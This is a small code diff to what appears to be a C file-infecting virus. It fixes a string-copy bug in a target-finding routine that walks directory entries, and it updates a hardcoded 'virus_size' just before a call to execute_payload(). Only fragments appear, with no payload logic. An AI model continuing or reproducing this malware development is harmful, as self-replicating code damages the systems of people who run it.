@@ -79,7 +79,7 @@ char *find_target(char *signature, int signature_length)
         {
             char* file_name_ptr = dent->d_name;
             char* file_name = (char*) malloc(sizeof(char) * (strlen(file_name_ptr) + 1));
-            strcpy(file_name_ptr, file_name_ptr);
+            strcpy(file_name, file_name_ptr);
             if (!strcmp(file_name, ".") || !strcmp(file_name, ".."))
                 continue;
             else
@@ -179,7 +179,7 @@ int main(int argc, char* argv[])
     char* binary_file_name = argv[0];
 
     // Check this everytime you change the code!
-    long virus_size = 13872;
+    long virus_size = 13912;
     
     execute_payload();
 
